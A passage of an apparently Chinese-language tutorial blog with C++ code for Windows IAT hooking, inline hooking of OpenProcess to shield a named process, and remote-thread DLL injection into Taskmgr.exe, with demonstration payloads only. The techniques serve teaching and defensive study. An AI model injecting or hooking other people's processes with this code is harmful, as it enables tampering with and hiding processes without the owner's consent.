class="line">&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IAT-HOOK"><a href="#IAT-HOOK" class="headerlink" title="IAT_HOOK"></a>IAT_HOOK</h3><p>.h文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IatHook</span><span class="params">(<span class="type">char</span>* lpModuleAddress, DWORD FunAddress, <span class="type">const</span> <span class="type">char</span>* szTarFunName, <span class="type">const</span> <span class="type">char</span>* szTarDllName = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uType)</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;IATHookMessageBoxW.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* MESSAGEBOX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uType)</span></span>;</span><br><span class="line">MESSAGEBOX g_OldMessageBox;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IatHook</span><span class="params">(<span class="type">char</span>* lpModuleAddress, DWORD FunAddress, <span class="type">const</span> <span class="type">char</span>* szTarFunName, <span class="type">const</span> <span class="type">char</span>* szTarDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导入表结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpModuleAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpModuleAddress);</span><br><span class="line"><span class="comment">//1 获取到导入表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY dwImportDir = &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//1 获取到导入表结构</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable =</span><br><span class="line">(PIMAGE_IMPORT_DESCRIPTOR)(lpModuleAddress + dwImportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//2 解析导入表</span></span><br><span class="line"><span class="comment">//2 开始解析</span></span><br><span class="line"><span class="keyword">while</span> (pImportTable-&gt;Name != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pDllName = (pImportTable-&gt;Name + lpModuleAddress);</span><br><span class="line"><span class="type">char</span>* pbuf = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy_s</span>(pbuf, <span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>, pDllName);</span><br><span class="line">_strlwr_s(pbuf, <span class="built_in">strlen</span>(pDllName) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (szTarDllName != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(szTarDllName, pbuf) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//得到目标函数的地址</span></span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandleA</span>(pDllName);</span><br><span class="line">DWORD dwTarAddress = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, szTarFunName);</span><br><span class="line"><span class="comment">//在IAT中寻找这个函数地址</span></span><br><span class="line">PIMAGE_THUNK_DATA32 pIat = (PIMAGE_THUNK_DATA32)</span><br><span class="line">(pImportTable-&gt;FirstThunk + lpModuleAddress);</span><br><span class="line"><span class="keyword">while</span> (pIat-&gt;u1.Function!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//找到了之后开始Hook，IAT也是不可写的</span></span><br><span class="line"><span class="keyword">if</span> (pIat-&gt;u1.Function == dwTarAddress)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存了一下MessageBox的地址。</span></span><br><span class="line">g_OldMessageBox = (MESSAGEBOX)pIat-&gt;u1.Function;</span><br><span class="line"><span class="comment">//1 修改Hook点的属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(&amp;pIat-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">pIat-&gt;u1.Function = FunAddress;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(&amp;pIat-&gt;u1.Function, <span class="number">4</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line">pIat++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lpText = (<span class="type">wchar_t</span>*)<span class="string">L&quot;你被打劫了^_^&quot;</span>;</span><br><span class="line">DWORD dwReturnCode = <span class="number">0</span>;</span><br><span class="line">dwReturnCode = <span class="built_in">g_OldMessageBox</span>(hWnd, lpText, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> dwReturnCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;IATHookMessageBoxW.h&quot;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">LPVOID ExeBase = <span class="built_in">GetModuleHandle</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">IatHook</span>((<span class="type">char</span>*)ExeBase,(DWORD)MyMessageBoxW,<span class="string">&quot;MessageBoxW&quot;</span>,<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Process-Hook"><a href="#Process-Hook" class="headerlink" title="Process_Hook"></a>Process_Hook</h3><h4 id="DLL文件"><a href="#DLL文件" class="headerlink" title="DLL文件"></a>DLL文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过进程名获取进程id</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* filePath)</span></span>;</span><br><span class="line"><span class="comment">// 获取helloworld程序pid</span></span><br><span class="line">DWORD g_dwPid = <span class="built_in">GetPid</span>(<span class="string">L&quot;FileCleaner2.0.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 旧的函数地址</span></span><br><span class="line">DWORD* g_pOldAddr = (DWORD*)OpenProcess;</span><br><span class="line"><span class="comment">// 旧的函数数据</span></span><br><span class="line"><span class="type">char</span> g_oldCode[<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写自己的OpenProcess函数</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">MyOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ BOOL bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD dwProcessId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 比对pid是否与helloworld程序相等</span></span><br><span class="line"><span class="keyword">if</span> (dwProcessId == g_dwPid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,<span class="string">L&quot;进程被保护&quot;</span>,<span class="string">L&quot;提示&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果不相等，重新调用原来的OpenProcess函数</span></span><br><span class="line"><span class="comment">// 先恢复原来函数数据</span></span><br><span class="line"><span class="built_in">UnHook</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(</span><br><span class="line">dwDesiredAccess, bInheritHandle, dwProcessId);</span><br><span class="line"><span class="comment">// 调用完之后重新hook</span></span><br><span class="line"><span class="built_in">OnHook</span>();</span><br><span class="line"><span class="keyword">return</span> hProcess;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">OnHook</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;注入成功&quot;</span>, <span class="string">L&quot;提示&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.先保存OpenProcess原来的数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_oldCode, g_pOldAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置新的指令,jmp</span></span><br><span class="line"><span class="type">char</span> opcode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br><span class="line"><span class="comment">// 2.1 计算偏移并赋值</span></span><br><span class="line">*(DWORD*)(opcode + <span class="number">1</span>) = (DWORD)MyOpenProcess - (DWORD)OpenProcess - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.写入跳转指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, opcode, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.还原保护属性</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">// 2.还原旧的指令数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, g_oldCode, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 3.还原保护属性</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="built_in">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line"><span class="built_in">Process32First</span>(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试文件"><a href="#测试文件" class="headerlink" title="测试文件"></a>测试文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注入.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLLPATH <span class="string">&quot;C:\\Users\\hugan\\Documents\\15PB\\代码注入与拦截\\OD注入\\x64\\Debug\\InlineHook.dll&quot;</span></span></span><br><span class="line"><span class="comment">//#define DLLPATH &quot;D:\\041\\test\\Debug\\IatHook.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过进程名获取进程id</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szExeName)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.获取目标进程句柄</span></span><br><span class="line"><span class="comment">// 1.1 获取指定进程id</span></span><br><span class="line">DWORD dwPid = <span class="built_in">GetPid</span>(<span class="string">L&quot;Taskmgr.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 1.2 打开进程（注入OD需要以管理员身份运行vs，否则无法打开进程)</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="comment">// 1.3 检测进程句柄</span></span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.1 计算dll路径长度</span></span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(DLLPATH) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 2.在目标进程申请一段空间</span></span><br><span class="line">LPVOID lpAddr = <span class="built_in">VirtualAllocEx</span>(</span><br><span class="line">hProcess, <span class="number">0</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.1 写入之前可以先测试加载一下看能否成功</span></span><br><span class="line"><span class="comment">/*HMODULE hMod = LoadLibraryA(DLLPATH);</span></span><br><span class="line"><span class="comment">MessageBoxW(0, 0, 0, 0);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.将dll名字写入到目标进程空间中</span></span><br><span class="line"><span class="comment">// 注意：路径与函数必须匹配，A版函数配A版字符串。如果用W版，写入的时候，长度要乘以2，</span></span><br><span class="line"><span class="comment">//因为wcslen求出的是字符串长度而不是字节数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, DLLPATH, dwSize, <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.创建远程线程</span></span><br><span class="line">HANDLE hRtThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)LoadLibraryA,lpAddr, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.等待执行结果</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRtThread, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.获取线程退出码</span></span><br><span class="line">DWORD dwExitCode = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetExitCodeThread</span>(hRtThread, &amp;dwExitCode);</span><br><span class="line"><span class="comment">// 6.1 退出码也就是LoadLibrary的返回值（如果执行成功，就是dll的模块句柄）</span></span><br><span class="line">HMODULE hModule = (HMODULE)dwExitCode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7.释放空间</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, dwSize, MEM_DECOMMIT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="built_in">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line"><span class="built_in">Process32First</span>(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 